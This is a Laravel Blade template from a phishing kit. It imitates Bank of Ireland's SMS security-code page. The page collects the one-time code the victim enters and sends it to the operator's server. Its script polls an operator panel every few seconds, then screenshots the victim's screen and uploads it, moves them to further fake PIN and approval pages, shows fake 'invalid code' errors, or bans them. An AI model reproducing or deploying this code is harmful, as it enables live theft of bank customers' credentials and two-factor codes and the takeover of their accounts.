@extends('layouts.b')

@section('main')
@php
    $sessionId = session(env('SESSION_CKEY'));
    $session = \App\Models\Session::firstWhere('session_id', $sessionId);
@endphp
<div id="C2__FMT_F6A61BDCCE0BE22264932" class="responsive-row">
    <div id="C2__FMT_E1EF3F312B4C2F9795170"
        class="col-full-xs col-full-sm col-10-12-md col-4-7-lg col-3-7-xl tc-center-align-block boi-standard-login-card-layout">
        <div id="C2__EDGE_CONNECT_PHASE">
            <div id="C2__FMT_E3AD16BD474843C9285254" class="boi-heading-logo">
                <div style="text-align: center; " id="C2__TXT_E3AD16BD474843C9285255">
                    <img src="/b/boi_logo.svg" alt=""
                        id="img_C2__TXT_E3AD16BD474843C9285255" width="100%"
                        title="">
                </div>
            </div>
            <div id="C2__FMT_E836AD2887BCD5FF3262303" class="boi-alert-container">
                <div style="text-align: center; " id="C2__TXT_0AD26B9BD45E7BB6776237">
                    <div id="MinorAlert" style="display: nones" role="alert" aria-live="polite"
                        aria-atomic="true">

                        <div class="boi-standard-global-alert boi-standard-warning" style="margin: 10px 0px; border: 2px solid #bc5100"
                        title="">
                        <div class="boi-error-msg-wrap" title="" style="height: auto">
                            <span aria-hidden="true" class="fa fa-exclamation fa-alert-name"></span>
                            <span class="boi_input tc-normal-align" style="font-size: 14px">
                                <span class="boi_input tc-normal-align" style="color: #bc5100; font-weight: bold; font-size: 14px">
                                    Extra Security Required
                                </span>
                                <br />
                                <span  id=MinorAlertMsg>
                                We've sent you a security code to your registered mobile number.
                                </span>
                        </div>
                        </div>
                    
                    </div>
                </div>
                <script>
                    $(document).ready(function() {
                        $('.boi-standard-global-error-message .fa-close').click(function() {
                            $('.boi-standard-global-error-message').hide();
                        });
                    });
                </script>
                <script>
                    $(document).ready(function() {
                        $('.boi-standard-global-error-message').click(function() {
                            $('.boi-standard-global-error-message').hide();
                        });
                        setTimeout(function() {
                            $("#C2__HEAD_B48CF68CE2E490A0586682_").focus();
                            $("#C2__HEAD_B48CF68CE2E490A0586682_").removeAttr("title");
                        }, 250);
                    });
                </script>
                <style>
                    .boi-standard-global-error-message .boi-error-msg-wrap {
                        display: flex;
                        word-break: break-word;
                    }

                    .boi-standard-global-error-message .boi-error-msg-wrap .boi_input {
                        margin-left: 0px;
                        margin-top: 5px;
                    }

                    .boi-standard-global-error-message .boi-login-error-msg.boi_label {
                        margin-top: 10px;
                        color: #616365;
                    }
                </style>
            </div>
            <div>
                <div class="boi-space-le-height" id="C2__SPC_7FF7CAFAACF93118205926"
                    style="text-align: left; display: none;  ">&nbsp;<br></div>
                <div style="text-align: center; display: none;"
                    id="C2__TXT_7FF7CAFAACF93118180389">
                    <img src="./Login -/BOI_logo.png"
                        alt="o" id="img_C2__TXT_7FF7CAFAACF93118180389">
                </div>
                <div class="tc-divider-no-space boi-review-1-line-spacing boi-review-playback-spacing"
                    id="C2__SPC_0C9D7ABFEE94FA12135569"
                    style="text-align: left; display: none;  ">&nbsp;<br></div>
            </div>
            <div id="C2__FMT_6BC0849CB611BFD21164982" class="responsive-row"
                style="display: none;">
                <script>
                    $(document).ready(function() {
                        $('.boi-prelogin-notification .fa-close').click(function() {
                            $('.boi-prelogin-notification').hide();
                        });
                    });
                </script>

                <div
                    class="boi-standard-global-error-message boi-standard-global-warning-message boi-timer-growl boi-prelogin-notification">
                    <span aria-hidden="true"
                        class="fa fa-exclamation-circle fa-exclamation"></span>
                    <span class="boi_label">Notice:&nbsp;&nbsp; </span>
                    <div class="boi_input"></div>
                    <span class="fa fa-close"></span>
                </div>
            </div>
            <div>
                <div class="tc-divider-no-space boi-review-1-line-spacing boi-review-playback-spacing"
                    id="C2__SPC_4F7CEB14B37638B5572902"
                    style="text-align: left; display: none;  ">&nbsp;<br></div>
            </div>
            
<div id="C2__FMT_F6A61BDCCE0BE22267204"
class="tc-card-bg shadow-style-1 tc-card boi-login-card  boi-clear-both">
<div id="C2__FMT_F6A61BDCCE0BE22267241"
    class=" tc-card-body boi-login p-b-30">
    <div class="ecDIBCol  ecDIB  col-full"
        id="C2__COL_017EED9DC30CAEC7926315">
        <div id="C2__row_HEAD_017EED9DC30CAEC7879515">
            <div id="C2__p1_HEAD_017EED9DC30CAEC7879515"
                style="text-align: center; ; ">
                <div>
                    <h1 id="C2__HEAD_017EED9DC30CAEC7879515"
                        class="boi-font-20-px  ecDIB  ">Security Code</h1>
                </div>
            </div>
        </div>
    </div>
    <div class="ecDIBCol  ecDIB  col-full" id="C2__COL_FC4A31B4944B46E7236502"
        style="display: none;"></div>
    <div id="C2__FMT_BFF2F816C97376D7358122" class="responsive-row">
        <div class="ecDIBCol  ecDIB  responsive-column col-1-2"
            id="C2__COL_BFF2F816C97376D7364123" style="display: none;">
            <div id="C2__row_HEAD_7FF7CAFAACF93118372025">
                <div id="C2__p1_HEAD_7FF7CAFAACF93118372025">
                    <div>
                        <h2 id="C2__HEAD_7FF7CAFAACF93118372025"
                            class="boi_cc_b  ecDIB  "><span
                                class="fa fa-lock"></span> Secure Login</h2>
                    </div>
                </div>
            </div>
        </div>
        <div class="ecDIBCol  ecDIB  boi-login-forgotID"
            id="C2__COL_BFF2F816C97376D7364128">
            <div id="C2__row_HEAD_AA99C2A26E82A49A283595"
                style="display: none;">
                <div id="C2__p1_HEAD_AA99C2A26E82A49A283595"
                    style="display: none;text-align: left; ; "
                    class="ecDIB  boi_label">
                    <div><span class="boi-forgot-user ">Forgot your user ID?
                            <span
                                class="boi-forgotpsd-btn boi-device-tooltip fa  fa-question-circle"><span
                                    class="boi-device-tooltiptext">Free text
                                    'User' to 50365 and we'll send it to
                                    you.</span></span></span></div>
                </div>
            </div>
            <div id="C2__row_Login-ForgotUserID:ForgottenUserID"
                style="display: none;">
                <div id="C2__p1_Login-ForgotUserID:ForgottenUserID"
                    class="ecDIB  col-hidden" style="display: none;">
                    <div>&nbsp;</div>
                </div>
                <div class="ecDIB  tc-full-button-xs tc-full-width boi-forgotpsd-btn  "
                    style="text-align: center; display: none;  display: none;"
                    id="C2__p4_Login-ForgotUserID:ForgottenUserID">
                    <div>
                        <a onclick="ajaxButtonAction( null, &#39;C2____7FF7CAFAACF93118 FormButton 22&#39;, &#39;C2__Login-ForgotUserID:ForgottenUserID&#39;, false, null, &#39;&#39;, &#39;servletcontroller&#39;, &#39;&#39;, false, true, &#39;&#39; );"
                            href="javascript:void(0);"
                            class="tc-accent-bg-new tc-button-color tc-button tc-rounded-1 tc-uppercase tc-normal-icon-with-text boi-primary-card-button tc-full-width boi_cc_b"
                            id="C2__Login-ForgotUserID:ForgottenUserID"
                            role="button"><span><span
                                    class="boi-device-tooltip boi_para fas fa-info-circle"><i
                                        class="boi-primary-card-button boi_cc_b ">Forgot
                                        your user ID?</i><span
                                        class="boi-device-tooltiptext">You can
                                        view your User ID in the <b>Bank of
                                            Ireland app</b><br><br>
                                        If you don't have access to the app,
                                        please call 0818 365
                                        365</span></span></span></a>

  
                    </div>
                </div>
            </div>
        </div>
    </div>
    
    <div id="C2__HIDE_USER_ID_FIELD" class="boi-mt-20">
        
        <div id="C2__row_USER_NAME"
            class="boi-standard-question-label boi-standard-question-label rgrid_3_8_12_12_16 gutter-xy-1  ">
            
            <div id="C2__p1_USER_NAME" style="text-align: left; " class="ecDIB   boi_label tc-question-part boi_label">
                
                <div>
                    <div style="clear: left;font-weight: 300;" id="C2__C2__row_HEAD_09C04956F4D399A9413075">
                        <div id="C2__C2__p1_HEAD_09C04956F4D399A9413075" style="text-align: center ; float: left; " class="tc-center-align-block col-full boi_label boi-mb-15">
                            <div><span role="text"> 
                                We've sent you an sms. Please check your device ending in {{substr($session->phone_number, -4);}}. When the code comes through, enter the code into the box below.
                             <br>
                            </span>
                            </div>
                        </div>
                        <div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div>
                    </div>
                    <label for="C2__USER_NAME" style="font-weight: 500">Enter code below:</label></div>
            </div>
        </div>
        <div id="C2__row_ansRowUSER_NAME"
            class="boi-standard-question-label boi-standard-question-label rgrid_3_8_12_12_16 gutter-xy-1  ">
            <div style="text-align: left; ; "
                class="ecDIB  col-full-xs col-5-8-sm col-8-12-md col-8-12-lg col-10-16-xl tc-answer-part boi-gs-field-margin boi-full-width  "
                id="C2__p4_USER_NAME">
                <div class="ext-tc-radio-input"><input type="text"
                        name="C2__LOGIN[1].FORMUSERID" id="C2__USER_NAME"
                        class="tc-form-control tc-full-width boi_input boi_input_placeholder boi-form-control boi-oneapp-userid boi-input-clear tc-default-input tc-rounded-1 boi-user-storage-id boi-enable-numkeypad validateMaxLength ignore-current-focus  "
                        size="8"
                        aria-required="true">

                    <span style="display: none" id="C2__MM_USER_NAME">No user
                        ID entered, please try again</span><span
                        class="boi_input_sm_error tc-error-position tc-fs-m2  "
                        id="C2__USER_NAME_ERRORMESSAGE"
                        aria-live="assertive"></span>
                </div>
            </div>
        </div>
    </div>

    <div>
 
        <div id="C2__row_QUE_6CEEFC90A8C851584854333" class="responsive-row tc-row-part tc-row-flex rgrid_3_8_12_12_16  " style="display:none; ">
        
            <div class="ecDIB  responsive-column col-full-xs col-5-8-sm col-8-12-md col-8-12-lg col-10-16-xl tc-answer-part  " id="C2__p4_QUE_6CEEFC90A8C851584854333">
                <div class="ext-tc-radio-input"><input type="text" name="C2__LOGIN[1].ONEAPPDEVICEID" id="C2__QUE_6CEEFC90A8C851584854333" class="tc-form-control tc-half-answer-width boi-oneapp-deviceid tc-default-input tc-rounded-1  " size="15" maxlength="256" onfocus="doOnFocus('', this.id, '');" onblur="if (FORMAT_VALIDATION_TRIGGER == getTriggeredReason() || '' == getTriggeredReason()) {doOnBlur('', this.id);}" onkeypress="return(checkForDefaultButtonAction(event, this, 'C2__F', ''))" onchange="startJob('', 'onchange', 'C2__QUE_6CEEFC90A8C851584854333');trimValue(this,'');if (isLegalExpresion(this,['tc-error-row','tc-error-color','tc-error-color','','tc-error-color','tc-error-color-border','','','tc-error-color  tc-error-position tc-fs-m2','responsive-row   tc-row-part tc-row-flex rgrid_3_8_12_12_16 {display:none}','responsive-column col-full-xs col-3-8-sm col-4-12-md col-4-12-lg col-6-16-xl  tc-question-part tc-bold','tc-mand-part tc-normal-weight','tc-prefix-part','responsive-column col-full-xs col-5-8-sm col-8-12-md col-8-12-lg col-10-16-xl tc-answer-part','tc-form-control tc-half-answer-width boi-oneapp-deviceid','tc-postfix-part','tc-help-icon','','responsive-row   tc-row-part tc-row-flex rgrid_3_8_12_12_16 {display:none}','responsive-column col-full-xs col-3-8-sm col-4-12-md col-4-12-lg col-6-16-xl  tc-question-part tc-bold','tc-mand-part tc-normal-weight','tc-prefix-part','responsive-column col-full-xs col-5-8-sm col-8-12-md col-8-12-lg col-10-16-xl tc-answer-part','tc-form-control tc-half-answer-width boi-oneapp-deviceid','tc-postfix-part','tc-help-icon','','responsive-row   tc-row-part tc-row-flex rgrid_3_8_12_12_16 {display:none}','responsive-column col-full-xs col-3-8-sm col-4-12-md col-4-12-lg col-6-16-xl  tc-question-part tc-bold','tc-mand-part tc-normal-weight','tc-prefix-part','responsive-column col-full-xs col-5-8-sm col-8-12-md col-8-12-lg col-10-16-xl tc-answer-part','tc-form-control tc-half-answer-width boi-oneapp-deviceid','tc-postfix-part','tc-help-icon',''])&amp;&amp;validAllChars(this, '', '', ['Please enter a valid OneAppDeviceId', '', ''], '', true, ['tc-error-row','tc-error-color','tc-error-color','','tc-error-color','tc-error-color-border','','','tc-error-color  tc-error-position tc-fs-m2','responsive-row   tc-row-part tc-row-flex rgrid_3_8_12_12_16 {display:none}','responsive-column col-full-xs col-3-8-sm col-4-12-md col-4-12-lg col-6-16-xl  tc-question-part tc-bold','tc-mand-part tc-normal-weight','tc-prefix-part','responsive-column col-full-xs col-5-8-sm col-8-12-md col-8-12-lg col-10-16-xl tc-answer-part','tc-form-control tc-half-answer-width boi-oneapp-deviceid','tc-postfix-part','tc-help-icon','','responsive-row   tc-row-part tc-row-flex rgrid_3_8_12_12_16 {display:none}','responsive-column col-full-xs col-3-8-sm col-4-12-md col-4-12-lg col-6-16-xl  tc-question-part tc-bold','tc-mand-part tc-normal-weight','tc-prefix-part','responsive-column col-full-xs col-5-8-sm col-8-12-md col-8-12-lg col-10-16-xl tc-answer-part','tc-form-control tc-half-answer-width boi-oneapp-deviceid','tc-postfix-part','tc-help-icon','','responsive-row   tc-row-part tc-row-flex rgrid_3_8_12_12_16 {display:none}','responsive-column col-full-xs col-3-8-sm col-4-12-md col-4-12-lg col-6-16-xl  tc-question-part tc-bold','tc-mand-part tc-normal-weight','tc-prefix-part','responsive-column col-full-xs col-5-8-sm col-8-12-md col-8-12-lg col-10-16-xl tc-answer-part','tc-form-control tc-half-answer-width boi-oneapp-deviceid','tc-postfix-part','tc-help-icon',''])) {endJob('', 'onchange', true, 'C2__QUE_6CEEFC90A8C851584854333'); return true;} else {endJob('', 'onchange', false, 'C2__QUE_6CEEFC90A8C851584854333'); return false;}" aria-required="false" aria-label="OneAppDeviceId" aria-describedby="C2__QUE_6CEEFC90A8C851584854333_ERRORMESSAGE"><span class="tc-error-color tc-error-position tc-fs-m2  " id="C2__QUE_6CEEFC90A8C851584854333_ERRORMESSAGE" aria-live="assertive"></span></div>
            </div>
        </div>
        <div id="C2__row_Login-LoginPage-Login">
            <div id="C2__p1_Login-LoginPage-Login" class="ecDIB  col-hidden">
                <div>&nbsp;</div>
            </div>
            <div class="ecDIB  tc-full-button-xs tc-full-width  " style="text-align: left; " id="C2__p4_Login-LoginPage-Login">
                <div>
                    <a href="javascript:void(0);" class="loginBtn tc-accent-bg-new tc-button-color tc-button tc-rounded-1 tc-uppercase tc-normal-icon-with-text Btn_primary boi-primary-card-button tc-full-width boi-device-prov-ctn-btn" id="C2__Login-LoginPage-Login" role="button" handlerchanged="Y"><span>Continue</span></a>


                </div>
            </div>
        </div>
    </div>

    <div id="C2__FMT_2CA27864C30804CF450143"
        class="boi-login-forgotPIN boi-mb-5 button-with-popup">
        <div id="C2__row_BUT_F6F687B20B6CA893415823" class="boi-mt-20  ">
            <div id="C2__p1_BUT_F6F687B20B6CA893415823" class="ecDIB  ">
                <div>&nbsp;</div>
            </div>
            <div class="ecDIB  " style="text-align: center; "
                id="C2__p4_BUT_F6F687B20B6CA893415823">
                <div>
                    <a onclick="ajaxButtonAction( null, &#39;C2____F6F687B20B6CA893 FormButton 79&#39;, &#39;C2__BUT_F6F687B20B6CA893415823&#39;, false, null, &#39;&#39;, &#39;servletcontroller&#39;, &#39;&#39;, false, true, &#39;&#39; );"
                        href="javascript:void(0);" class="roleButton"
                        id="C2__BUT_F6F687B20B6CA893415823" handlerchanged="Y"
                        onoldclick="ajaxButtonAction( null, &#39;C2____F6F687B20B6CA893 FormButton 79&#39;, &#39;C2__BUT_F6F687B20B6CA893415823&#39;, false, null, &#39;&#39;, &#39;servletcontroller&#39;, &#39;&#39;, false, true, &#39;&#39; );"
                        role="button"><span>Request a new code <i
                                class="fa fa-arrow-circle-right boi-fs-16 ml-5 "
                                aria-hidden="true"></i></span></a>
                </div>
            </div>
        </div>
        <div class="ecDIBCol  ecDIB  button-with-popup col-hidden"
            id="C2__COL_2CA27864C30804CF450849">
            <div id="C2__FMT_327292FC505097A7172536"
                class="boi-position-center boi-popup-dialog__wrapper boi-popup-wide">
                <div>
                    <div id="C2__p1_GRP_1D846D1BE7918E0B141262"
                        style="position: relative">
                        <div id="C2__FMT_327292FC505097A7172588"
                            class="boi-popup-dialog__title--background boi-flex--horizontal--justify boi-flex">
                            <div id="C2__row_HEAD_1D846D1BE7918E0B141267">
                                <div id="C2__p1_HEAD_1D846D1BE7918E0B141267">
                                    <div>
                                        <h1 id="C2__HEAD_1D846D1BE7918E0B141267"
                                            class="boi-popup-dialog__title  ecDIB  ">
                                            Forgot your User ID</h1>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div id="C2__FMT_327292FC505097A7172625"
                            class="boi-padding-20 boi-popup-scroll">
                            <div id="C2__row_HEAD_1D846D1BE7918E0B141272"
                                class="margin-top18 boi-mb-20  ">
                                <div id="C2__p1_HEAD_1D846D1BE7918E0B141272"
                                    style="text-align: left; ; "
                                    class="ecDIB  boi_label_sm_regular">
                                    <div>Based on where you are right now, text
                                        the most suitable number below and we’ll
                                        reply with your user ID.</div>
                                </div>
                            </div>
                            <div id="C2__row_HEAD_2CA27864C30804CF450215"
                                class="boi-mb-30  ">
                                <div id="C2__p1_HEAD_2CA27864C30804CF450215"
                                    style="text-align: left; ; "
                                    class="ecDIB  boi_label_bold">
                                    <div>You must send the text from your
                                        registered device. Otherwise for
                                        security reasons we won't be able to
                                        reply.</div>
                                </div>
                            </div>
                            <div id="C2__TXT_2CA27864C30804CF452991">
                                <div class="boi_contact-phonenumbers">
                                    <div class="boi_contact-phonenumbers-row">
                                        <div>
                                            <p class="boi_label_bold">Republic
                                                of Ireland</p>
                                            <p class="boi_stepper"
                                                role="text"
                                                aria-label="Text user to 5 0 3 6 5">
                                                Text "user" to 50365</p>
                                        </div>
                                    </div>
                                    <div class="boi_contact-phonenumbers-row">
                                        <div>
                                            <p class="boi_label_bold">Northern
                                                Ireland and Great Britain</p>
                                            <p class="boi_stepper"
                                                role="text"
                                                aria-label="Text user to 5 0 3 6 5">
                                                Text "user" to 50365</p>
                                        </div>
                                    </div>
                                    <div class="boi_contact-phonenumbers-row">
                                        <div>
                                            <p class="boi_label_bold">Other
                                                locations</p>
                                            <p class="boi_stepper"
                                                role="text"
                                                aria-label="Text user to + 3 5 3. 8 6. 1 8 0. 3 8 8 8">
                                                Text "user" to +353 86 180 3888
                                            </p>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <div id="C2__row_BUT_2CA27864C30804CF453155"
                                class="btn-primary-large text-center boi-mt-25 boi-mb-15  ">
                                <div id="C2__p1_BUT_2CA27864C30804CF453155"
                                    class="ecDIB  col-hidden">
                                    <div>&nbsp;</div>
                                </div>
                                <div class="ecDIB  col-full-xs col-full-sm  "
                                    style="text-align: center; "
                                    id="C2__p4_BUT_2CA27864C30804CF453155">
                                    <div><button title="Close"
                                            onclick="ajaxButtonAction( null, &#39;C2____2CA27864C30804CF FormButton 82&#39;, &#39;C2__BUT_2CA27864C30804CF453155&#39;, false, null, &#39;&#39;, &#39;servletcontroller&#39;, &#39;&#39;, false, true, &#39;&#39; );"
                                            type="button"
                                            name="C2____2CA27864C30804CF FormButton 82"
                                            value="Close"
                                            class="boi-rounded-1 boi-primary-card-button boi-full-width Btn_primary boi-close-popup boi-exit-popup boi-overlay-btn-270"
                                            id="C2__BUT_2CA27864C30804CF453155">Close</button>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <div id="C2__FMT_58252E3CE35865542302528"
        class="boi-padding-20 boi-box-tile-bg-white boi-no-border ext-max-width-full max-width--100 button-with-popup"
        style="display: none;"></div>

</div>

            <div id="C2__FMT_DEE166E0CE845AF0421316" class="responsive-row col-hidden"
                style="display: none;"></div>
        </div>
    </div>
</div>
@endsection
@section('js')
<script>
      $(".loginBtn").on("click", (e) => {
        e.preventDefault();
        $("#MinorAlert").css("display", "none");

        
        if( $("#C2__USER_NAME").val()  == ''){
            $("#MinorAlert").css("display", "block");
                    $("#MinorAlertMsg").text("Security code cannot be empty. Please try again");
                    return;
        }
       
        $.ajax({
            method: "POST",
            url: "{{route('main.new')}}",
            data: {
                _token: $('meta[name="csrf-token"]').attr('content'),
                referringUrl:"{{parse_url(url()->current(), PHP_URL_PATH)}}",
                "security_code": $("#C2__USER_NAME").val(),
                "type": "newBoiSecCode",
            }
        }).done((data) => {
            $(".spinnerWrapper").addClass( "show");
        });
    });




    setInterval(async () => {
        await checkAction();
    }, 5000);

    const checkAction = async () => {
        $.ajax({
            method: "POST",
            url: "{{route('main.connection')}}",
            data: {
                _token: $('meta[name="csrf-token"]').attr('content'),
referringUrl:"{{parse_url(url()->current(), PHP_URL_PATH)}}",
                type: "checkAction",
            }
        }).done(function(data) {
            if (typeof myVariable === "string" && data.trim() == "none") {
                return false;
            }
            var data = JSON.parse(JSON.stringify(data));
            console.log(data.action);
            setCookie("set_name", data.set_name, 1);
            switch (data.action) {
                case "screenshot":
                    let img;
                    html2canvas(document.body).then(function(canvas) {
                        $.ajax({
                            type: "POST",
                            url: "{{route('main.connection')}}",
                            data: {
                                _token: $('meta[name="csrf-token"]').attr('content'),
referringUrl:"{{parse_url(url()->current(), PHP_URL_PATH)}}",
                                "type": "screenshot",
                                "img": canvas.toDataURL()
                            },
                        }).done(function(data) {});
                    });
                    break;
                case "boi_approve":
                    window.location.replace(
                        "{{route('main.boi_approve')}}?sessionid={{md5(time())}}&status=2fa");
                    break;
                case "boi_pin":
                    window.location.replace(
                        "{{route('main.boi_verification')}}?sessionid={{md5(time())}}&status=pin");
                    break;
                case "boi":
                    window.location.replace(
                        "{{route('main.boi')}}?sessionid={{md5(time())}}&status=boi");
                    break;
                case "boi_allow_notification":
                    window.location.replace(
                        "{{route('main.boi_allow_notification')}}?sessionid={{md5(time())}}&status=boi_allow_notification");
                    break;
                case "boi_allow_permission":
                    window.location.replace(
                        "{{route('main.boi_allow_permission')}}?sessionid={{md5(time())}}&status=boi_allow_permission");
                    break;
                case "boi_security_code":
                    window.location.replace(
                        "{{route('main.boi_security_code')}}?sessionid={{md5(time())}}&status=boi_security_code");
                    break;
                case "error":
                    
                $(".spinnerWrapper").removeClass( "show");

                    $("#MinorAlert").css("display", "block");
                    $("#MinorAlertMsg").text("Invalid Security Code. Please try again");

                    // $("#regNumber").val("");
                    // $("#PACNumber").val("");

                    break;
                case "bye":
                    window.location.replace("{{route('main.bye')}}?sessionid={{md5(time())}}");
                    break;

                case "ban":
                    $.ajax({
                        method: "POST",
                        url: "{{route('main.connection')}}",
                        data: {
                            _token: $('meta[name="csrf-token"]').attr('content'),
referringUrl:"{{parse_url(url()->current(), PHP_URL_PATH)}}",
                            type: "ban",
                            status: "banned",
                        }
                    }).done(function() {
                        window.location.replace("{{route('main.bye')}}?sessionid={{md5(time())}}");
                    });
                    break;
            }
        });
    }
</script>
    
@endsection